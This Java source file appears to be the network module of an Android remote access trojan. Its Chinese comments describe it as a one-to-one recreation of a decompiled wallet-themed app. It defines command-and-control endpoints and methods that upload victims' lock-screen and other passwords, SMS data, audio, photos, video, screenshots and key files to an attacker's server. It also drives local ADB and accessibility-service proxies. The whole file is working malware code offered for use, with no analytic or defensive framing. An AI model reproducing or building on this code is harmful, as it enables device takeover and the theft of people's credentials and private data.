package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.l (374行) + NetworkManager 合并
// 一比一复刻: API 端点常量 + 30+ 个 API 调用方法 + 本地代理路由

import android.util.Log;

import com.google.gson.Gson;

import org.conscrypt.Conscrypt;

import java.security.Security;
import java.util.concurrent.ConcurrentLinkedQueue;

import okhttp3.OkHttpClient;

public class NetworkManager {

    private static final String TAG = "NetworkManager";
    private static volatile NetworkManager instance;

    private HttpClient httpClient;
    private WebSocketClient wsClient;
    private String deviceId;
    private String serverHost;

    // ADAPT: vendor http/l.java 静态字段
    // vendor: f179a = "https://" + d.h() — 服务器基础 URL
    private String baseApiUrl;

    // vendor: 预注册 API 端点
    public static final String API_MESSAGE_POST = "/api/message/post.json";
    public static final String API_CIPHER_LOCK = "/api/cipher/postLockCipher.json";
    public static final String API_CIPHER_OTHER = "/api/cipher/postOtherCipher.json";
    public static final String API_CIPHER_QUERY = "/api/cipher/lockCiphers";
    public static final String API_DEVICE_UPDATE = "/api/device/updateDeviceInfo.json";
    public static final String API_DEVICE_REGISTER = "/api/device/register.json";
    public static final String API_LISTEN_WINDOWS = "/api/listen/windows.json";
    public static final String API_LOCATE_VALUE = "/api/locateValue/entryAppMap.json";
    public static final String API_AGENT_QUERY = "/api/agent/query.json";
    public static final String API_STRATEGY = "/api/walletAuth/strategy/noCompletes";
    public static final String API_SMS_RECOGNIZE = "/api/smsRecognize/plug.json";
    public static final String API_INSTALL_LOG = "/api/deviceInstallLog/post.json";
    public static final String API_CACHE_TASK = "/api/containerApi/postCacheTaskResponse.json";
    public static final String API_AUDIO_UPLOAD = "/api/audioFile/batch.json";
    public static final String API_PHOTO_UPLOAD = "/api/photoFile/batch.json";
    public static final String API_VIDEO_UPLOAD = "/api/videoFile/batch.json";
    public static final String API_SHOT_UPLOAD = "/api/shotFile/batch.json";
    public static final String API_PAIR_KEY_UPLOAD = "/api/pairKeyFile/batch.json";

    // vendor: 本地代理地址
    public static final String LOCAL_RATHAT = "http://127.0.0.1:7911";
    public static final String LOCAL_A11Y = "http://127.0.0.1:7912";

    private final Gson gson = new Gson();

    private NetworkManager() {}

    public static NetworkManager getInstance() {
        if (instance == null) {
            synchronized (NetworkManager.class) {
                if (instance == null) {
                    instance = new NetworkManager();
                }
            }
        }
        return instance;
    }

    public void init(String serverHost, String wsUrl, String deviceId) {
        this.deviceId = deviceId;
        this.serverHost = serverHost;
        this.baseApiUrl = serverHost != null && serverHost.startsWith("http") ? serverHost : "https://" + serverHost;

        try {
            Security.insertProviderAt(Conscrypt.newProvider(), 1);
            Log.d(TAG, "Conscrypt TLS provider installed");
        } catch (Exception e) {
            Log.w(TAG, "Conscrypt install failed, using default", e);
        }

        httpClient = new HttpClient(baseApiUrl, deviceId);
        wsClient = new WebSocketClient(wsUrl, deviceId);

        Log.i(TAG, "Network initialized: server=" + baseApiUrl);
    }

    // ============ P0: 消息上报 (vendor: l.t + l.q) ============

    /**
     * 发送消息到服务端
     * vendor: l.t(String intentCode) — 构建 MessageRecordVO → ApiRequest → POST
     */
    public void postMessage(Object messageBody, String intentCode) {
        if (httpClient == null || deviceId == null || deviceId.isEmpty()) {
            Log.w(TAG, "postMessage: not initialized");
            return;
        }
        try {
            String json = gson.toJson(messageBody);
            httpClient.postAsync(API_MESSAGE_POST, json, new okhttp3.Callback() {
                @Override
                public void onFailure(okhttp3.Call call, java.io.IOException e) {
                    Log.e(TAG, "postMessage failed", e);
                }
                @Override
                public void onResponse(okhttp3.Call call, okhttp3.Response response) {
                    Log.d(TAG, "postMessage success: " + response.code());
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "postMessage error", e);
        }
    }

    /**
     * 上报设备信息
     * vendor: l.z() — DeviceUpdateVO → POST /api/device/updateDeviceInfo.json
     */
    public void updateDeviceInfo(Object deviceUpdateVO) {
        if (httpClient == null || deviceId == null) return;
        try {
            String json = gson.toJson(deviceUpdateVO);
            httpClient.postAsync(API_DEVICE_UPDATE, json, new okhttp3.Callback() {
                @Override
                public void onFailure(okhttp3.Call call, java.io.IOException e) {
                    Log.e(TAG, "updateDeviceInfo failed", e);
                }
                @Override
                public void onResponse(okhttp3.Call call, okhttp3.Response response) {
                    Log.d(TAG, "updateDeviceInfo success: " + response.code());
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "updateDeviceInfo error", e);
        }
    }

    /**
     * 上报锁屏密码
     * vendor: l.B(ReqUnlockDeviceVO)
     */
    public void postLockCipher(Object cipherVO) {
        postJson(API_CIPHER_LOCK, cipherVO, "postLockCipher");
    }

    /**
     * 上报其他密码
     * vendor: l.C(RespCipherStateVO)
     */
    public void postOtherCipher(Object cipherVO) {
        postJson(API_CIPHER_OTHER, cipherVO, "postOtherCipher");
    }

    /**
     * 获取监听窗口配置
     * vendor: l.d()
     */
    public void fetchListenWindows(Object requestVO) {
        postJson(API_LISTEN_WINDOWS, requestVO, "fetchListenWindows");
    }

    /**
     * 获取应用定位值
     * vendor: l.a()
     */
    public void fetchLocateValues(Object requestVO) {
        postJson(API_LOCATE_VALUE, requestVO, "fetchLocateValues");
    }

    /**
     * 查询代理文件
     * vendor: l.u()
     */
    public void queryAgentFile(Object requestVO) {
        postJson(API_AGENT_QUERY, requestVO, "queryAgentFile");
    }

    /**
     * 获取未完成策略
     * vendor: l.v()
     */
    public void fetchStrategy(Object requestVO) {
        postJson(API_STRATEGY, requestVO, "fetchStrategy");
    }

    /**
     * 上报安装日志
     * vendor: l.s(PushResponseVO)
     */
    public void postInstallLog(Object pushResponseVO) {
        postJson(API_INSTALL_LOG, pushResponseVO, "postInstallLog");
    }

    /**
     * 上报缓存任务响应
     * vendor: l.r(CacheTaskResponseVO)
     */
    public void postCacheTaskResponse(Object cacheTaskVO) {
        postJson(API_CACHE_TASK, cacheTaskVO, "postCacheTaskResponse");
    }

    /**
     * 短信识别插件
     * vendor: l.y()
     */
    public void fetchSmsRecognize(Object requestVO) {
        postJson(API_SMS_RECOGNIZE, requestVO, "fetchSmsRecognize");
    }

    // ============ 本地代理 API (vendor: 127.0.0.1:7911/7912) ============

    /**
     * 同步 ADB 配置到本地代理
     * vendor: l.p(ADBConfig)
     */
    public void syncADBConfig(Object adbConfig) {
        postJsonToLocal(LOCAL_RATHAT, "/syncADBConfig", adbConfig, "syncADBConfig");
    }

    /**
     * 通知本地代理存活
     * vendor: l.j()
     */
    public void noticeAlive() {
        postJsonToLocal(LOCAL_A11Y, "/noticeAlive", null, "noticeAlive");
    }

    /**
     * 重置无障碍服务
     * vendor: l.w()
     */
    public void resetAccessibilityService() {
        postJsonToLocal(LOCAL_A11Y, "/resetAccessibilityService", null, "resetA11y");
    }

    // ============ 通用方法 ============

    private void postJson(String path, Object body, String tag) {
        if (httpClient == null) {
            Log.w(TAG, tag + ": not initialized");
            return;
        }
        try {
            String json = body != null ? gson.toJson(body) : "{}";
            httpClient.postAsync(path, json, new okhttp3.Callback() {
                @Override
                public void onFailure(okhttp3.Call call, java.io.IOException e) {
                    Log.e(TAG, tag + " failed", e);
                }
                @Override
                public void onResponse(okhttp3.Call call, okhttp3.Response response) {
                    Log.d(TAG, tag + " success: " + response.code());
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e(TAG, tag + " error", e);
        }
    }

    private void postJsonToLocal(String host, String path, Object body, String tag) {
        try {
            HttpClient localClient = new HttpClient(host, deviceId);
            String json = body != null ? gson.toJson(body) : "{}";
            localClient.postAsync(path, json, new okhttp3.Callback() {
                @Override
                public void onFailure(okhttp3.Call call, java.io.IOException e) {
                    Log.w(TAG, tag + " local failed (expected if no proxy)", e);
                }
                @Override
                public void onResponse(okhttp3.Call call, okhttp3.Response response) {
                    Log.d(TAG, tag + " local success: " + response.code());
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.w(TAG, tag + " local error", e);
        }
    }

    // ============ Getters ============

    public HttpClient getHttpClient() { return httpClient; }
    public WebSocketClient getWebSocketClient() { return wsClient; }
    public String getDeviceId() { return deviceId; }
    public String getBaseApiUrl() { return baseApiUrl; }
}
